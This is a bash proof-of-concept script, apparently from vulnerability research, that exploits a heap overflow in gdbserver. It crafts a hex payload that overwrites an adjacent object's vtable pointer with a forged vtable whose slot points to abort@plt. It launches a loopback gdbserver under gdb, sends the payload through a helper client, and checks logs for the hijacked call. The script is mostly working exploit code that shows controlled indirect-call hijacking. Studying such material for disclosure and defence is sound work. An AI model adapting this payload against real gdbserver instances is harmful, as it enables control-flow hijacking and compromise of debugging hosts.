#!/bin/bash
# Forged-vtable control-flow marker against the plant-started, loopback-only
# plain pinned gdbserver.  gdb is used only to fix the load address so the
# payload can name a fake vtable; it never forces the indirect call.
#
# Natural layout measured in gdb-heap-*.log: src=xmalloc(2) at ...61c460,
# adjacent live tdesc_feature at ...61c480.  The 64 decoded bytes are:
#   0..23  filler inside src
#  24..31  next chunk size, kept at 0x21 (0x61+PREV_INUSE by glibc accounting)
#  32..39  vptr of the adjacent object = ...61c488 (object+8)
#  40..55  first two slots of the fake vtable (unused)
#  56..63  fake vtable slot +0x10 = abort@plt (0x...561f70)
# The devirtualizing destructor reads [vptr+0x10], sees a value different
# from tdesc_feature's D0, and takes `call *%rax` with rdi = the object.
set -u
BIN=${1:?need plain gdbserver binary}
PORT=${2:-34620}
TAG=${3:-marker}
PAYLOAD=${4:-}
HERE=$(cd "$(dirname "$0")" && pwd)
E="$HERE/evidence"
mkdir -p "$E"
LOG="$E/marker-$TAG.log"
GDBCMD="$E/marker-$TAG.cmd"
rm -f "$LOG" "$GDBCMD"

if [ -z "$PAYLOAD" ]; then
  PAYLOAD="$(printf '41%.0s' {1..24})"
  PAYLOAD+="6100000000000000"
  PAYLOAD+="88c4615555550000"
  PAYLOAD+="$(printf '42%.0s' {1..16})"
  PAYLOAD+="701f565555550000"
fi
printf 'MARKER_PAYLOAD_HEX=%s\n' "$PAYLOAD"

cat >"$GDBCMD" <<'EOF'
set pagination off
set confirm off
set follow-fork-mode parent
run
printf "\n=== AFTER_RUN ===\n"
bt 8
info registers rip rax rdi
EOF

gdb -q -batch -x "$GDBCMD" --args "$BIN" --once --debug=remote \
  "127.0.0.1:$PORT" /bin/true >"$LOG" 2>&1 &
GDB=$!
for _ in $(seq 1 100); do
  if grep -q 'Listening on port' "$LOG" 2>/dev/null; then break; fi
  sleep 0.1
done
python3 "$HERE/live_probe_hex.py" "$PORT" "$PAYLOAD" 1 \
  >"$E/marker-$TAG.client.out" 2>&1
CLIENT_RC=$?
wait "$GDB"
GDB_RC=$?
echo "CLIENT_RC=$CLIENT_RC GDB_RC=$GDB_RC"
echo "--- client ---"
cat "$E/marker-$TAG.client.out"
echo "--- gdb markers ---"
grep -aE 'AFTER_RUN|Program received signal|SIGABRT|SIGSEGV|abort|call|exited normally' "$LOG" | head -20
